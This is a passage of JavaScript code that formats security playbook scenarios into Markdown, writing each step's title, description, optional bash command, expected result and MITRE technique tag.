    lines.push('### Steps');
    for (const step of scenario.steps) {
      lines.push(`#### Step ${step.step}: ${step.title}`);
      lines.push(step.description);

      if (step.command) {
        lines.push('```bash');
        lines.push(step.command);
        lines.push('```');
      }

      lines.push(`**Expected**: ${step.expectedResult}`);

      if (step.mitreTechnique) {
        lines.push(`**MITRE**: ${step.mitreTechnique}`);
      }
      lines.push('');
    }

    // Separator between scenarios
    if (i < playbook.scenarios.length - 1) {
      lines.push('---');
      lines.push('');
    }
  }

  return lines.join('\n');
}
